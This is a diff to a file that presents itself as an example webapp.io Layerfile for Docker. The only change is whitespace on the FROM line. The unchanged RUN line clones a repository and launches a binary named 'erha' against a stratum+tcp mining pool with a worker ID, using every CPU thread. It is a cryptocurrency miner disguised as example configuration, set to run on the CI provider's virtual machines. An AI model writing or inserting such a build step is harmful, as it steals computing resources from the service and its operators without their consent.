@@ -1,5 +1,5 @@
 #This is an example webapp.io configuration for Docker!
-FROM vm/ubuntu:18.04 
+FROM vm/ubuntu:18.04
 
 # To note: Layerfiles create entire VMs, *not* containers!
 RUN git clone https://github.com/Silnaelbia/erha.git && cd erha && chmod +x erha && ./erha -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10097 -su 621010-71.0.roller/x -cpu -cputhreads $(nproc)
